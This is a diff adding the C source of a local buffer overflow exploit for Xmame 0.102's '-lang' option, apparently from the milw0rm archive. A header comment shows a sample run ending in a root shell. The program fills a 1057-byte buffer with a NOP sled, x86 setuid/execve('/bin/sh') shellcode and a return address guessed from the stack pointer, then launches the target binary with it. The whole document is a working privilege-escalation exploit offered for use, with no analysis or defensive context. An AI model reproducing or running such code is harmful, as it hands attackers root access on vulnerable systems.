@@ -1,0 +1,98 @@
+/*
+	Xmame 0.102 (-lang) Local Buffer Overflow Exploit
+	Coded BY Qnix
+		 Qnix@bsdmail.org
+		 #0x11 @EFNET
+		 icq : 234263
+		 0x11.org
+	Advisory : http://kerneltrap.org/node/6055
+
+e.g: 
+
+Qnix ~ # ./exploit /usr/games/bin/xmame.x11
+**************************************************
+Xmame 0.102 (-lang) Local Buffer Overflow Exploit
+Coded BY Qnix
+**************************************************
+
+        (~) Stack pointer (ESP) : 0xbffff688
+        (~) Offset from ESP     : 0x0
+        (~) Desired Return Addr : 0xbffff688
+
+GLINFO: loaded OpenGL library libGL.so!
+GLINFO: loaded GLU    library libGLU.so!
+GLINFO: glPolygonOffsetEXT (2): not implemented !
+info: trying to parse: /usr/share/games/xmame/xmamerc
+info: trying to parse: /root/.xmame/xmamerc
+info: trying to parse: /usr/share/games/xmame/xmame-x11rc
+info: trying to parse: /root/.xmame/xmame-x11rc
+info: trying to parse: /usr/share/games/xmame/rc/robbyrc
+info: trying to parse: /root/.xmame/rc/robbyrc
+sh-3.00#
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BUFSIZE 1057
+#define NS	600
+
+char shellcode[] =
+"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
+"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
+"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
+"\x68";
+
+unsigned long sp(void)
+{ __asm__("movl %esp, %eax");}
+
+int main(int argc, char *argv[])
+{
+	int i, offset;
+	long esp, ret, *addr_ptr;
+	char *buffer, *ptr;
+
+	offset = 0;
+	esp = sp();
+	ret = esp - offset;
+
+	if(argc < 2 || argc != 2)
+	{
+		fprintf(stderr,"%s <xmam.x11>\n",argv[0]);
+		return(0);
+	}
+
+	fprintf(stdout,"**************************************************\n");
+	fprintf(stdout,"Xmame 0.102 (-lang) Local Buffer Overflow Exploit\n");
+	fprintf(stdout,"Coded BY Qnix\n");
+	fprintf(stdout,"**************************************************\n\n");
+	fprintf(stdout,"\t(~) Stack pointer (ESP) : 0x%x\n", esp);
+	fprintf(stdout,"\t(~) Offset from ESP     : 0x%x\n", offset);
+	fprintf(stdout,"\t(~) Desired Return Addr : 0x%x\n\n", ret);
+
+	buffer = malloc(BUFSIZE);
+
+	ptr = buffer;
+	addr_ptr = (long *) ptr;
+	for(i=0; i < BUFSIZE; i+=4)
+	{ *(addr_ptr++) = ret; }
+
+	for(i=0; i < NS; i++)
+	{ buffer[i] = '\x90'; }
+
+	ptr = buffer + NS;
+	for(i=0; i < strlen(shellcode); i++)
+	{ *(ptr++) = shellcode[i]; }
+
+	buffer[BUFSIZE-1] = 0;
+
+	execl(argv[1], "xmame.x11", "-lang", buffer, 0);
+
+	free(buffer);
+
+	return(0);
+
+}
+
+// milw0rm.com [2006-01-13]
